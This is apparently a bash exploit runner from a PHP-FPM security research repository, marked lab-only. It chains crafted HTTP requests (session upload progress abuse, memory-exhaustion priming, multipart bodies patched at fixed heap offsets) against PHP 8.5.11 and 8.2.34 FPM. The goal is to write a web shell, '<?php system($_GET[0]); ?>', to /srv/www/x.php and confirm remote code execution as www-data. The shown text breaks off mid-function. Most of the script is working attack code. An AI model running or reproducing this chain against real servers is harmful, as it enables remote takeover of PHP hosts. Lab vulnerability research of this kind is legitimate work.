#!/bin/bash
# r41_http_chain.sh -- PHP 8.5.11 / 8.2.34 FPM 128M pure-HTTP staged runner
# (curated release copy; lab-only).
#
# Copyright (c) 2026 The PHP2Shell research authors. MIT License (see LICENSE).
# LAB-ONLY: authorized lab targets only. The runner restarts containers,
# executes container commands and sends HTTP traffic; never point it at
# third-party systems. See ACCEPTABLE_USE.md and SECURITY.md.
#
# Target: CAL (default container p2s-fpm8511-128, host port 19113) with
# PROFILE=8511 (PHP 8.5.11), or CAL=p2s-fpm8234-128 PORT=19134 with
# PROFILE=8234 (PHP 8.2.34, pre-fix real-CVE quadrant); 128M, nginx
# client_max_body_size=0. Every session byte is written by HTTP requests.
# WORKERS=4 adds the lab pinning mode: 3x concurrent GET /_sleep.php holds
# three of the four static children, SLEEP_T sets the hold time and P4W_GDB=1
# enables the one-shot primed==free gdb assertion (calibration only). 4w labs
# need pm=static/max_children=4, request_terminate_timeout > SLEEP_T and an
# exclusive container; each round prints ASSERT4 (markers/free/primed pid/SR/
# x.php/negctrl/health) plus stage-code assertions (R2a 502, R3 200).
# Both lab pages (_r41prime2.php, _sleep.php) are shipped in labs/fpm/www/ and
# installed by this script when missing.
# BG(unserialize) offsets are version-specific: level is +0x358 on 8.2.34 and
# +0x370 on 8.5.11; the P4W_GDB check parses BOTH offsets and requires exactly
# one level==1 (a legitimate 0 at the other offset must not mask the match).
# A host-level sampler counts debugger usage during the run: every 0.2s it
# checks `pgrep -x gdb` on the host plus /proc/<php-fpm>/status TracerPid!=0;
# the final `NO-GDB CHECK ... gdb_hits=<real>` line is measured, not declared.
#
# Release usage (from the repository root; no absolute workspace paths):
#   ROUNDS=3 bash labs/fpm/r41_http_chain.sh --clean
#   PROFILE=8234 ROUNDS=3 CAL=p2s-fpm8234-128 PORT=19134 \
#     bash labs/fpm/r41_http_chain.sh --clean
#   WORKERS=4 ROUNDS=3 CAL=p2s-fpm8511-4w PORT=19142 \
#     bash labs/fpm/r41_http_chain.sh --clean             # 8.5.11 4w
#   PROFILE=8234 WORKERS=4 ROUNDS=3 CAL=p2s-fpm8234-4w PORT=19138 \
#     bash labs/fpm/r41_http_chain.sh --clean             # 8.2.34 4w
#
# STATUS 2026-10-31 (release v10): 1w and 4w pure-HTTP chains are matrix
# PROOFs (fpm-8511-http-1w/-4w, fpm-8234-http-1w/-4w); 4w rounds are gdb-free
# (measured sampler gdb_hits=0) with ASSERT4 OK. Evidence:
# docs/research/fpm-8511-http.md, fpm-8234-port.md, fpm-8511-4w.md and
# fpm-8234-4w.md in this repository (main research log: docs/106/108/110/111).
#
# CLI / env (wrapper contract):
#   STAGE   run|prime|r1|r2a|r2b|r3|selftest  (default run; run = full chain)
#   PROFILE 8511|8234  (default 8511; per-version constants below)
#   WORKERS 1|4        (default 1; WORKERS=4 selects the pin mode below)
#   ROUNDS  rounds for STAGE=run            (default 1)
#   CAL     container name                  (default p2s-fpm8511-128)
#   PORT    host HTTP port                  (default 19113)
#   --clean / --no-clean  per-round restart + rm x.php + rm our session ids
#                         (default: clean on for run; --no-clean disables)
#
# WORKERS=4 (pin mode; 2026-10-31 4w labs; see docs/research/fpm-8234-4w.md
# and docs/research/fpm-8511-4w.md):
#   pm=static 4.  Each prime segment becomes:
#     restart -> HTTP grow SP -> restart -> 3x concurrent GET /_sleep.php with
#     0.35s stagger (marker file = pid of the child handling it) -> wait for 3
#     distinct markers -> the only free child (= 4 children - 3 sleepers) is
#     where the next GET prime lands -> immediate R2a on that same child ->
#     SR must be 47B (stale consumed).  Sleep page /_sleep.php is installed by
#     this script (lab precondition; release copy in labs/fpm/www/_sleep.php);
#     marker path /tmp/p4w_marker_<id>.
#   Pin retries: markers not unique / free child count != 1 / children != 4
#     => kill sleepers + restart + retry (<=3).  If the optional one-shot gdb
#     check (P4W_GDB=1) is enabled, primed_pid (BG level=1) must equal
#     free_pid; with P4W_GDB=0 the ASSERT4 line reports
#     primed_pid=inferred:<free> and relies on the SR oracle (only the free
#     child can consume the stale state).  Use P4W_GDB=1 only outside the
#     3/3 sampler runs (gdb would be counted by the NO-GDB sampler).
#
# Output contract (machine-parseable):
#   PRIME ... / ASSERT OK|FAIL ... per round
#   ASSERT4 OK|FAIL round=n grow=.. prime=.. fatal=.. sleeper_markers=..
#                       sleepers_alive=.. primed_pid=.. free_pid=.. sr2a=..
#                       sr2ak2=.. r2a=.. r2ak2=.. r3=.. xphp=.. negctrl_no_uid33=1
#                       health=..            (WORKERS=4 only)
#   ROUND n: R1(code)=.. prime=.. R2a(code)=.. sr=..B ... R3=.. x.php=..B RCE=..
#   NEGCTRL: ...            (request without ?0 must not contain uid=33)
#   NO-GDB CHECK rounds=N gdb_hits=<measured>
#   PASS=n/N
#   <host-level HTTP judge text, contains uid=33(www-data)>
#
# Fixed constants (per PROFILE; both are the same pad=64-style prime plane):
#   PROFILE=8511 (PHP 8.5.11 FPM, CAL default p2s-fpm8511-128, PORT 19113):
#     d_off=0x110000, E_off=0x12C000, DT=d+0x3000,
#     progress=chunk+0x62000, ps_files=chunk+0x56208
#     8 lifters + BIG S=0x97000 (F=0x79000), copy1=d+0x1018,
#     AIM=-103416 (-0x193F8), AIM_W=-109505, SESS_SP=7,050,470
#   PROFILE=8234 (PHP 8.2.34 FPM, CAL should be p2s-fpm8234-128, PORT 19134):
#     d_off=0xFE000 (E=d+0x1C000, DT=d+0x3000 same relative offsets),
#     progress=chunk+0x62000, ps_files=chunk+0x56208
#     8 lifters + BIG S=0x84000 (F=0x7A000), copy1=d+0x1018,
#     AIM=-94200 (-0x16FF8), AIM_W=-100289, SESS_SP=7,048,390
#   R3 patch offsets (BIG-relative, identical in both profiles):
#     DT[0]=0 @0x1FE8, DT+0x10..0x20=0 @0x1FF8, DT+0x20..0x30=0 @0x2008,
#     DT+0x30 len=15 @0x2018, DT+0x38 "/srv/www/x.php\0" @0x2020 (EXACT 15B
#     slice), E[0]=aim @0x1AFE8; assert len(fill)==0x97000|0x84000.
#   (The per-profile BG(unserialize) offsets differ (+0x368/+0x370 for 8.5.11,
#   +0x350/+0x358 for 8.2.34) but this runner never reads BG: calibration is a
#   one-off outside the chain.)
#   R2a/R2a(K2) post-state: SR=47B / SR=70B (two scalar records).
#   prime response body/log contains "Allowed memory size" or "tried to
#   allocate"; php-fpm child pid unchanged across prime.
#   post conditions: /srv/www/x.php >= 300B; host GET ?0=id shows uid=33.
#
# Preconditions (documented, not written by the chain):
#   - lab pages /srv/www/{plain.php,index.php,_r41prime2.php}; prime page is
#     installed by this script if missing/incomplete (documented precondition).
#     WORKERS=4 additionally installs /_sleep.php (lab scheduling page).
#   - session.save_path=/var/lib/php/sessions, cleanup=Off, memory_limit=128M,
#     single worker, nginx port mapped to host PORT.
#   - WORKERS=4 needs pm=static/max_children=4 and request_terminate_timeout
#     greater than the pin window (the 4w lab uses 120s; sleep t defaults 60s).
set -u

CAL=${CAL:-${CONTAINER:-p2s-fpm8511-128}}
PORT=${PORT:-19113}
URL=${URL:-http://127.0.0.1:${PORT}}
ROUNDS=${ROUNDS:-1}
STAGE=${STAGE:-run}
PROFILE=${PROFILE:-8511}
WORKERS=${WORKERS:-1}
SLEEP_T=${SLEEP_T:-60}
P4W_GDB=${P4W_GDB:-0}
case "$WORKERS" in
  1|4) : ;;
  *) echo "unknown WORKERS=${WORKERS} (use 1|4)" >&2; exit 2 ;;
esac
case "$P4W_GDB" in 0|1) : ;; *) echo "unknown P4W_GDB=${P4W_GDB} (use 0|1)" >&2; exit 2 ;; esac
SID_SP=${SID_SP:-acdbeef0acdbeef0acdbeef0acdbeef0}
SID_SR=${SID_SR:-ccccddddeeeeffff0000111122223333}
CODE=${CODE:-'<?php system($_GET[0]); ?>'}
KEY=${KEY:-$CODE}
case "$PROFILE" in
  8511) P_S=0x97000; P_AIM=-103416; P_AIM_W=-109505; P_SESS_SP=7050470 ;;
  8234) P_S=0x84000; P_AIM=-94200;  P_AIM_W=-100289; P_SESS_SP=7048390 ;;
  *) echo "unknown PROFILE=${PROFILE} (use 8511|8234)" >&2; exit 2 ;;
esac
AIM=${AIM:-$P_AIM}
AIM_W=${AIM_W:-$P_AIM_W}
S=${S:-$P_S}
NL=${NL:-8}
PRIME_Q=${PRIME_Q:-mb=114&pad=64}
SESS_SP_EXPECT=${SESS_SP_EXPECT:-$P_SESS_SP}
BND=----r41d
CLEAN=1
for a in "$@"; do
  case "$a" in
    --clean) CLEAN=1 ;;
    --no-clean) CLEAN=0 ;;
    *) echo "unknown arg: $a" >&2; exit 2 ;;
  esac
done
W=$(mktemp -d /tmp/r41http.XXXXXX) || exit 1
trap 'sampler_stop >/dev/null 2>&1 || true; rm -rf "$W"' EXIT

# ---------- host-level debugger sampler ----------
sampler_start() {
  : > "$W/gdb_hits"
  touch "$W/sampler.on"
  local cid
  cid=$(docker inspect -f '{{.Id}}' "$CAL" 2>/dev/null || true)
  (
    while [ -e "$W/sampler.on" ]; do
      h=0
      # gdb processes scoped to THIS container (host-wide pgrep would count
      # unrelated lab gdb sessions and make the check meaningless)
      if [ -n "$cid" ]; then
        for gp in $(pgrep -x gdb 2>/dev/null); do
          grep -q "$cid" "/proc/$gp/cgroup" 2>/dev/null && h=$((h + 1))
        done
      fi
      for p in $(pgrep -f 'php-fpm: pool www' 2>/dev/null); do
        if [ -n "$cid" ] && ! grep -q "$cid" "/proc/$p/cgroup" 2>/dev/null; then
          continue
        fi
        t=$(awk '/^TracerPid:/{print $2}' "/proc/$p/status" 2>/dev/null)
        [ -n "${t:-}" ] && [ "$t" != "0" ] && h=$((h + 1))
      done
      echo "$h" >> "$W/gdb_hits"
      sleep 0.2
    done
  ) &
  SAMPLER_PID=$!
}
sampler_stop() {
  rm -f "$W/sampler.on"
  [ -n "${SAMPLER_PID:-}" ] && wait "$SAMPLER_PID" 2>/dev/null
  SAMPLER_PID=
}
sampler_total() { awk '{s += $1} END {print s + 0}' "$W/gdb_hits" 2>/dev/null || echo 0; }

# ---------- helpers ----------
cpid() {
  docker exec "$CAL" sh -c 'for p in /proc/[0-9]*; do [ "$(cat "$p/comm" 2>/dev/null)" = "php-fpm" ] || continue; c=$(tr "\0" " " < "$p/cmdline" 2>/dev/null); case "$c" in *"pool www"*) echo "${p#/proc/}";; esac; done' 2>/dev/null | head -1
}
children() { # all pool www child pids as a space separated string
  docker exec "$CAL" sh -c 'for p in /proc/[0-9]*; do [ "$(cat "$p/comm" 2>/dev/null)" = "php-fpm" ] || continue; c=$(tr "\0" " " < "$p/cmdline" 2>/dev/null); case "$c" in *"pool www"*) echo "${p#/proc/}";; esac; done' 2>/dev/null | tr '\n' ' ' | sed 's/ *$//'
}
SLEEP_JOBS=""
kill_sleepers() { # stop the host-side sleeper clients (children die on restart)
  local j
  for j in ${SLEEP_JOBS:-}; do kill "$j" 2>/dev/null || true; done
  SLEEP_JOBS=""
}
sleepers_alive() { # 1 when every sleeper client is still running (pin still valid)
  local alive=1 j
  if [ -z "${SLEEP_JOBS:-}" ]; then P4W_SLEEPERS_ALIVE=0; return 1; fi
  for j in $SLEEP_JOBS; do kill -0 "$j" 2>/dev/null || alive=0; done
  P4W_SLEEPERS_ALIVE=$alive
  [ "$alive" = "1" ]
}
pin_sleepers() { # WORKERS=4: sets P4W_MARKERS/P4W_SLP/P4W_FREE_PID/P4W_ATTEMPT
  local attempt i n id child_cnt free
  for attempt in 1 2 3; do
    # wait until all 4 static children exist
    for i in $(seq 1 40); do child_cnt=$(children | wc -w); [ "$child_cnt" -ge 4 ] && break; sleep 0.1; done
    if [ "$child_cnt" -lt 4 ]; then
      echo "PIN attempt=$attempt children=$child_cnt (<4)"; P4W_PIN_ERR="children_lt4"; return 1
    fi
    docker exec "$CAL" sh -c 'rm -f /tmp/p4w_marker_*' >/dev/null 2>&1
    SLEEP_JOBS=""
    for id in 1 2 3; do
      curl -s -o /dev/null --max-time 200 "$URL/_sleep.php?t=$SLEEP_T&id=$id" >/dev/null 2>&1 &
      SLEEP_JOBS="$SLEEP_JOBS $!"
      sleep 0.35
    done
    n=0
    for i in $(seq 1 80); do
      n=$(docker exec "$CAL" sh -c 'cat /tmp/p4w_marker_* 2>/dev/null | sort -u | wc -l' 2>/dev/null | tr -d '\r')
      [ "${n:-0}" -ge 3 ] && break
      sleep 0.1
    done
    P4W_SLP=$(docker exec "$CAL" sh -c 'cat /tmp/p4w_marker_* 2>/dev/null | sort -u' 2>/dev/null | tr '\n' ' ' | sed 's/ *$//')
    P4W_MARKERS=$(echo "$P4W_SLP" | wc -w)
    free=""
    for i in $(children); do
      case " $P4W_SLP " in *" $i "*) : ;; *) free="$free $i" ;; esac
    done
    P4W_FREE_PID=$(echo "$free" | sed 's/^ *//; s/ *$//')
    P4W_FREE_CNT=$(echo "$P4W_FREE_PID" | wc -w)
    if [ "$P4W_MARKERS" = "3" ] && [ "$P4W_FREE_CNT" = "1" ]; then
      P4W_ATTEMPT=$attempt
      echo "PIN attempt=$attempt sleepers=[$P4W_SLP] markers=$P4W_MARKERS free=[$P4W_FREE_PID]"
      return 0
    fi
    echo "PIN attempt=$attempt FAIL markers=$P4W_MARKERS free_cnt=$P4W_FREE_CNT sleepers=[$P4W_SLP]; restart+retry"
    P4W_PIN_ERR="markers=$P4W_MARKERS free=$P4W_FREE_CNT"
    kill_sleepers
    docker restart "$CAL" >/dev/null 2>&1; sleep 2; up || return 1
  done
  return 1
}
bg4_scan() { # optional one-shot gdb: sets P4W_PRIMED_PID (BG level=1 child)
  [ "$P4W_GDB" = "1" ] || return 0
  P4W_PRIMED_PID=""
  docker exec -i "$CAL" sh -c 'cat > /tmp/p4w_bg.gdb' <<'GDB'
set pagination off
set confirm off
set height 0
set debuginfod enabled off
set $bg=(char*)&basic_globals
printf "D350=%p\n", (void*)*(void**)($bg+0x350)
printf "L358=%u\n", *(unsigned int*)($bg+0x358)
printf "D368=%p\n", (void*)*(void**)($bg+0x368)
printf "L370=%u\n", *(unsigned int*)($bg+0x370)
detach
quit
GDB
  local p out l358 l370 count=0
  for p in $(children); do
    out=$(docker exec "$CAL" timeout 25 gdb -batch -q -p "$p" -x /tmp/p4w_bg.gdb 2>&1 || true)
    l358=$(echo "$out" | sed -n 's/^L358=\([0-9]*\).*/\1/p' | head -1)
    l370=$(echo "$out" | sed -n 's/^L370=\([0-9]*\).*/\1/p' | head -1)
    # version-agnostic: 8.2.34 BG data/level = +0x350/+0x358, 8.5.11 = +0x368/
    # +0x370.  Parse BOTH and accept either ==1; on 8.5.11 L358 is always 0, so
    # a non-empty 0 must not mask L370 (the old first-non-empty fallback did).
    if [ "${l358:-0}" = "1" ] || [ "${l370:-0}" = "1" ]; then P4W_PRIMED_PID=$p; count=$((count + 1)); fi
  done
  P4W_PRIMED_COUNT=$count
  [ "$count" = "1" ] || P4W_PRIMED_PID=""
  echo "PINCHECK primed_pid=${P4W_PRIMED_PID:-NONE} free_pid=${P4W_FREE_PID:-?} level1_count=$P4W_PRIMED_COUNT gdb=1"
}
up() { # cheap liveness probe; /index.php is the documented neutral page
  local i st
  for i in $(seq 1 60); do
    st=$(curl -s -o /dev/null -w '%{http_code}' --max-time 2 "$URL/index.php" || true)
    [ "$st" = "200" ] && return 0
    sleep 0.3
  done
  return 1
}
sess_size() { docker exec "$CAL" sh -c "stat -c %s /var/lib/php/sessions/sess_$1 2>/dev/null || echo MISSING"; }
post() { # $1 body file, $2 sid (default SR)
  curl -s -o /dev/null -w '%{http_code}' --max-time 60 \
    -H "Cookie: PHPSESSID=${2:-$SID_SR}" \
    -H "Content-Type: multipart/form-data; boundary=$BND" \
    --data-binary "@$1" "$URL/plain.php"
}
clean_round() {
  kill_sleepers 2>/dev/null || true
  [ "$WORKERS" = "4" ] && docker exec "$CAL" sh -c 'rm -f /tmp/p4w_marker_*' >/dev/null 2>&1
  [ "$CLEAN" = "1" ] || return 0
  docker restart "$CAL" >/dev/null 2>&1; sleep 2
  up || { echo "UP FAIL" >&2; return 1; }
  docker exec "$CAL" sh -c "rm -f /var/lib/php/sessions/sess_$SID_SR /var/lib/php/sessions/sess_$SID_SP /srv/www/x.php"
}
install_pages() {
  local ok=0
  if docker exec "$CAL" sh -c 'test -f /srv/www/_r41prime2.php' >/dev/null 2>&1; then
    if docker exec "$CAL" sh -c 'grep -q _r41prime2 /srv/www/_r41prime2.php && grep -q session_start /srv/www/_r41prime2.php' >/dev/null 2>&1; then
      ok=1
    fi
  fi
  [ "$ok" = "1" ] || {
    docker exec -i "$CAL" sh -c 'cat > /srv/www/_r41prime2.php' <<'PHP'
<?php /* _r41prime2.php */
$pad=(int)($_GET["pad"]??0);
$mb=(int)($_GET["mb"]??0);
$keep=array();
for($i=0;$i<$pad;$i++){ $keep[]=str_repeat("Z",4080); }
if($mb>0){ $keep[]=str_repeat("B",$mb*1048576); }
session_start();
echo "OK";
PHP
    echo "INSTALLED /srv/www/_r41prime2.php (documented precondition)"
  }
  # WORKERS=4 scheduling page (lab precondition): marker = child pid, then sleep
  if [ "$WORKERS" = "4" ]; then
    local sok=0
    if docker exec "$CAL" sh -c 'grep -q p4w_sleep /srv/www/_sleep.php' >/dev/null 2>&1; then sok=1; fi
    [ "$sok" = "1" ] || {
      docker exec -i "$CAL" sh -c 'cat > /srv/www/_sleep.php' <<'PHP'
<?php /* p4w_sleep */
$id = preg_replace('/[^0-9]/', '', (string)($_GET["id"] ?? "0"));
file_put_contents('/tmp/p4w_marker_' . $id, getmypid() . "\n");
sleep((int)($_GET["t"] ?? 60));
echo "SLEEP";
PHP
      echo "INSTALLED /srv/www/_sleep.php (WORKERS=4 lab scheduling precondition)"
    }
  fi
}
genprog() { IDX=$1 KEYLEN=$2 W=$W BND=$BND python3 - <<'PY'
import os
idx = int(os.environ["IDX"]); keylen = int(os.environ["KEYLEN"])
W = os.environ["W"]; BND = os.environ["BND"].encode()
key = (b"K" * keylen) + ("%04d" % idx).encode()
parts = [b"--" + BND + b'\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' + key + b"\r\n"]
for j in range(20):
    fn = (b"F" * 100) + ("%04d%02d" % (idx, j)).encode() + b".bin"
    parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="f%02d"; filename="' % j + fn
                 + b'"\r\nContent-Type: application/octet-stream\r\n\r\nZ\r\n')
parts.append(b"--" + BND + b"--\r\n")
open(W + "/gb", "wb").write(b"".join(parts))
PY
}
grow_sp() {
  docker exec "$CAL" sh -c "rm -f /var/lib/php/sessions/sess_$SID_SP" >/dev/null 2>&1
  local i code
  for i in 1 2 3 4 5 6 7; do
    genprog "$i" 8
    code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 180 -H "Cookie: PHPSESSID=$SID_SP" \
      -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary @"$W/gb" "$URL/plain.php")
    [ "$code" = "200" ] || { echo "GROW FAIL i=$i code=$code" >&2; return 1; }
  done
  genprog 8 7000000
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 180 -H "Cookie: PHPSESSID=$SID_SP" \
    -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary @"$W/gb" "$URL/plain.php")
  [ "$code" = "200" ] || { echo "GROW FAIL big code=$code" >&2; return 1; }
}
prime() { # restart -> HTTP grow SP -> restart [-> pin (4w)] -> GET prime
  # Sets PRIME_*; for WORKERS=4 also P4W_MARKERS/P4W_SLP/P4W_FREE_PID (and
  # P4W_PRIMED_PID when P4W_GDB=1).	Sleepers stay held until the caller sends
  # the stage (R2a) so that the stage lands on the same primed child; the
  # caller MUST call kill_sleepers right after that stage.
  local lb ld
  docker restart "$CAL" >/dev/null 2>&1; sleep 2; up || return 1
  grow_sp || return 1
  SESS_SP_ACTUAL=$(sess_size "$SID_SP")
  docker restart "$CAL" >/dev/null 2>&1; sleep 2; up || return 1
  P4W_MARKERS=0; P4W_SLP=""; P4W_FREE_PID=""; P4W_FREE_CNT=0; P4W_ATTEMPT=0
  P4W_PRIMED_PID=""; P4W_PRIMED_COUNT=0; P4W_CHILD_SAME=1; P4W_PIN_ERR=""
  P4W_SLEEPERS_ALIVE=""
  if [ "$WORKERS" = "4" ]; then
    pin_sleepers || { echo "PRIME PIN FAIL ${P4W_PIN_ERR:-pin}"; return 1; }
    PRIME_PID_BEFORE=$(children)
  else
    PRIME_PID_BEFORE=$(cpid)
  fi
  local log_before log_delta
  log_before=$(docker logs "$CAL" 2>&1 | wc -l)
  PRIME_CODE=$(curl -s -o "$W/primebody" -w '%{http_code}' --max-time 180 \
    -H "Cookie: PHPSESSID=$SID_SP" "$URL/_r41prime2.php?$PRIME_Q")
  PRIME_PID_AFTER=$(cpid)
  if [ "$WORKERS" = "4" ]; then
    PRIME_PID_AFTER=$(children)
    [ "$PRIME_PID_BEFORE" = "$PRIME_PID_AFTER" ] || P4W_CHILD_SAME=0
    if [ "$PRIME_CODE" = "500" ]; then bg4_scan; fi
  fi
  log_delta=$(docker logs "$CAL" 2>&1 | tail -n +$((log_before + 1)) 2>/dev/null)
  PRIME_FATAL=0
  grep -qE 'Allowed memory size|tried to allocate' "$W/primebody" 2>/dev/null && PRIME_FATAL=1
  echo "$log_delta" | grep -qE 'Allowed memory size|tried to allocate' 2>/dev/null && PRIME_FATAL=1
  echo "$log_delta" > "$W/primelog"
  PRIME_BODY_BYTES=$(stat -c %s "$W/primebody" 2>/dev/null || echo '?')
  [ "$PRIME_CODE" = "500" ] || { kill_sleepers; return 1; }
  return 0
}
mkprog() { KEYV=$1 W=$W BND=$BND python3 - <<'PY'
import os
key = os.environ["KEYV"].encode(); W = os.environ["W"]; BND = os.environ["BND"].encode()
parts = [b"--" + BND + b'\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' + key + b"\r\n"]
parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="f"; filename="' + b"F" * 100
             + b'.bin"\r\nContent-Type: application/octet-stream\r\n\r\nZ\r\n')
parts.append(b"--" + BND + b"--\r\n")
open(W + "/progbody", "wb").write(b"".join(parts))
PY
}
mkbody() { MODE=$1 AIMV=$2 KEYV=$3 S=$S NL=$NL W=$W BND=$BND python3 - <<'PY'
import os, struct
mode = os.environ["MODE"]; aim = int(os.environ["AIMV"]); key = os.environ["KEYV"].encode()
S = int(os.environ["S"], 0); nl = int(os.environ["NL"])
W = os.environ["W"]; BND = os.environ["BND"].encode()
parts = []
for i in range(nl):
    parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="L%03d"\r\n\r\n' % i
                 + b"L" * 0xE00 + b"\r\n")
b = bytearray(S)
b[0x1FE8:0x1FF0] = struct.pack("<Q", 0)                 # DT[0] = 0
if mode == "r2a":
    b[0x1AFE8:0x1AFF0] = struct.pack("<q", aim)         # E[0] = scalar aim
elif mode == "r2b":
    b[0x2008:0x2018] = b"\x00" * 0x10
    b[0x2018:0x2020] = struct.pack("<Q", 8)
    b[0x1AFE8:0x1AFF0] = struct.pack("<q", aim)
elif mode == "r3":
    b[0x1FF8:0x2008] = b"\x00" * 0x10                   # DT+0x10..0x1f
    b[0x2008:0x2018] = b"\x00" * 0x10                   # DT+0x20..0x2f
    b[0x2018:0x2020] = struct.pack("<Q", 15)            # DT+0x30 len incl NUL
    b[0x2020:0x2020 + 15] = b"/srv/www/x.php\x00"       # DT+0x38 val, exact 15B
    b[0x1AFE8:0x1AFF0] = struct.pack("<q", aim)         # E[0] = writer aim
assert len(b) == S, ("BIG value length must equal S", len(b), S)
parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="BIG"\r\n\r\n' + bytes(b) + b"\r\n")
parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n' + key + b"\r\n")
parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="f"; filename="a.bin"\r\nContent-Type: application/octet-stream\r\n\r\nZ\r\n')
if mode == "r2b":
    for i in range(920):
        parts.append(b"--" + BND + b'\r\nContent-Disposition: form-data; name="x%d[a][a]"\r\n\r\n\r\n' % i)
parts.append(b"--" + BND + b"--\r\n")
open(W + "/stagebody", "wb").write(b"".join(parts))
PY
}
# host-level judge (runs on the VM host, not inside the container)
HOST_JUDGE() { curl -s --max-time 6 "$URL/x.php?0=id" 2>&1 | head -1 | tr -d '\r'; }
HOST_NEG() { curl -s --max-time 6 "$URL/x.php" 2>&1 | tr -d '\r'; }
judge() {
  XSZ=$(docker exec "$CAL" sh -c "stat -c %s /srv/www/x.php 2>/dev/null" | tr -d '\r')
  RCE=$(HOST_JUDGE)
  NEG=$(HOST_NEG)
  NEG_UID=0
  case "$NEG" in *uid=33*) NEG_UID=1 ;; esac
  HEALTH=""
  if [ "$WORKERS" = "4" ]; then
    HEALTH=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "$URL/plain.php" 2>/dev/null || true)
  fi
  echo "NEGCTRL: no-param-body-bytes=${#NEG} contains_uid33=$NEG_UID"
}
assert_round() { # $1 round; sets ASSERT_FAIL text (empty = ok)
  ASSERT_FAIL=""
  PRIME_FATAL_NOTE=""
  [ "${SESS_SP_ACTUAL:-0}" = "$SESS_SP_EXPECT" ] || ASSERT_FAIL="$ASSERT_FAIL sess_SP=$SESS_SP_ACTUAL"
  if [ "$WORKERS" = "4" ]; then
    # 8.2.34-4w lab ini has log_errors=Off (fatal text not written to docker
    # logs): accept the measured OOM signature 500 + 0B body as the fatal
    # evidence (`fatal=inferred`); the ASSERT4 line records prime=500 and the
    # /tmp lab artifact is SP-session truncation.  When PRIME_FATAL=1 (a lab
    # with log_errors=On) nothing changes.
    if [ "${PRIME_FATAL:-0}" = "1" ]; then :;
    elif [ "${PRIME_CODE:-}" = "500" ] && [ "${PRIME_BODY_BYTES:-x}" = "0" ]; then PRIME_FATAL_NOTE="inferred(500/0B,log_errors=Off)";
    else ASSERT_FAIL="$ASSERT_FAIL prime_fatal=0"; fi
  else
    [ "${PRIME_FATAL:-0}" = "1" ] || ASSERT_FAIL="$ASSERT_FAIL prime_fatal=0"
  fi
  [ "${PRIME_PID_BEFORE:-x}" = "${PRIME_PID_AFTER:-y}" ] || ASSERT_FAIL="$ASSERT_FAIL child_pid_changed"
  [ "${SR_2A:-0}" = "47" ] || ASSERT_FAIL="$ASSERT_FAIL sr2a=${SR_2A:-?}"
  [ "${SR_2AK2:-0}" = "70" ] || ASSERT_FAIL="$ASSERT_FAIL sr2ak2=${SR_2AK2:-?}"
  [ "${R2A_CODE:-x}" = "502" ] || ASSERT_FAIL="$ASSERT_FAIL r2a_code=${R2A_CODE:-?}"
  [ "${R2AK2_CODE:-x}" = "502" ] || ASSERT_FAIL="$ASSERT_FAIL r2ak2_code=${R2AK2_CODE:-?}"
  [ "${R3_CODE:-x}" = "200" ] || ASSERT_FAIL="$ASSERT_FAIL r3_code=${R3_CODE:-?}"
  if ! [ "${XSZ:-0}" != "MISSING" ] || ! [ "${XSZ:-0}" -ge 300 ] 2>/dev/null; then
    ASSERT_FAIL="$ASSERT_FAIL xphp=${XSZ:-?}"
  fi
  [ "${NEG_UID:-1}" = "0" ] || ASSERT_FAIL="$ASSERT_FAIL negctrl_has_uid33"
  case "$RCE" in *uid=33*) : ;; *) ASSERT_FAIL="$ASSERT_FAIL judge_no_uid33" ;; esac
  if [ -n "$ASSERT_FAIL" ]; then
    echo "ASSERT FAIL round=$1$ASSERT_FAIL"
    return 1
  fi
  echo "ASSERT OK round=$1 sess_SP=$SESS_SP_ACTUAL prime_fatal=${PRIME_FATAL_NOTE:-$PRIME_FATAL} child_same=1 r2a=$R2A_CODE sr2a=$SR_2A r2ak2=$R2AK2_CODE sr2ak2=$SR_2AK2 r3=$R3_CODE xphp=${XSZ}B negctrl_no_uid33=1"
  return 0
}
assert4_round() { # WORKERS=4 pin-mode assertions (8.2.34 4w, 2026-10-31)
  [ "$WORKERS" = "4" ] || return 0
  local fail=""
  [ "${SESS_SP_ACTUAL:-0}" = "$SESS_SP_EXPECT" ] || fail="$fail grow=${SESS_SP_ACTUAL:-?}"
  [ "${PRIME_CODE:-}" = "500" ] || fail="$fail prime=${PRIME_CODE:-?}"
  [ "${PRIME_BODY_BYTES:-?}" = "0" ] || fail="$fail prime_body=${PRIME_BODY_BYTES:-?}"
  [ "${P4W_MARKERS:-0}" = "3" ] || fail="$fail sleeper_markers=${P4W_MARKERS:-0}"
  [ "${P4W_FREE_CNT:-0}" = "1" ] || fail="$fail free_cnt=${P4W_FREE_CNT:-0}"
  [ "${P4W_CHILD_SAME:-0}" = "1" ] || fail="$fail child_changed"
  [ "${P4W_SLEEPERS_ALIVE:-0}" = "1" ] || fail="$fail sleepers_not_alive"
  if [ "$P4W_GDB" = "1" ]; then
    [ "${P4W_PRIMED_COUNT:-0}" = "1" ] || fail="$fail bg_level1_count=${P4W_PRIMED_COUNT:-0}"
    if [ -z "${P4W_PRIMED_PID:-}" ] || [ "$P4W_PRIMED_PID" != "$P4W_FREE_PID" ]; then
      fail="$fail primed_pid=${P4W_PRIMED_PID:-NONE}!=free_pid=$P4W_FREE_PID"
    fi
  fi
  [ "${SR_2A:-0}" = "47" ] || fail="$fail sr2a=${SR_2A:-?}"
  [ "${SR_2AK2:-0}" = "70" ] || fail="$fail sr2ak2=${SR_2AK2:-?}"
  [ "${R2A_CODE:-x}" = "502" ] || fail="$fail r2a_code=${R2A_CODE:-?}"
  [ "${R2AK2_CODE:-x}" = "502" ] || fail="$fail r2ak2_code=${R2AK2_CODE:-?}"
  [ "${R3_CODE:-x}" = "200" ] || fail="$fail r3_code=${R3_CODE:-?}"
  if ! [ "${XSZ:-0}" != "MISSING" ] || ! [ "${XSZ:-0}" -ge 300 ] 2>/dev/null; then
